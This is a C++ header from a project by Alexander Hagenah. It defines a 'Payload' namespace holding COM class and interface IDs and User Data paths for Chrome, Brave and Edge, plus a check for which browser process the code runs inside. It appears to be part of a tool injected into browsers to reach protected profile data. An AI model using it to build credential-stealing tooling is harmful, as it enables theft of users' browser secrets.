// (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#pragma once

#include "../core/common.hpp"
#include <string>
#include <vector>
#include <map>
#include <ShlObj.h>

namespace Payload {

    struct BrowserConfig {
        std::string name;
        std::wstring processName;
        CLSID clsid;
        IID iid;
        std::filesystem::path userDataPath;
    };

    inline std::filesystem::path GetLocalAppData() {
        PWSTR path = nullptr;
        if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &path))) {
            std::filesystem::path p(path);
            CoTaskMemFree(path);
            return p;
        }
        return {};
    }

    inline const std::map<std::string, BrowserConfig> GetConfigs() {
        auto localApp = GetLocalAppData();
        return {
            {"chrome", {"Chrome", L"chrome.exe", 
                {0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}}, 
                {0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}}, 
                localApp / "Google" / "Chrome" / "User Data"}},
            {"brave", {"Brave", L"brave.exe", 
                {0x576B31AF, 0x6369, 0x4B6B, {0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B}}, 
                {0xF396861E, 0x0C8E, 0x4C71, {0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9}}, 
                localApp / "BraveSoftware" / "Brave-Browser" / "User Data"}},
            {"edge", {"Edge", L"msedge.exe", 
                {0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67}}, 
                {0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B}}, 
                localApp / "Microsoft" / "Edge" / "User Data"}}
        };
    }

    inline BrowserConfig DetectBrowser() {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        std::string exe = std::filesystem::path(path).filename().string();
        std::transform(exe.begin(), exe.end(), exe.begin(), ::tolower);

        if (exe == "chrome.exe") return GetConfigs().at("chrome");
        if (exe == "brave.exe") return GetConfigs().at("brave");
        if (exe == "msedge.exe") return GetConfigs().at("edge");
        
        throw std::runtime_error("Unknown browser process");
    }

}
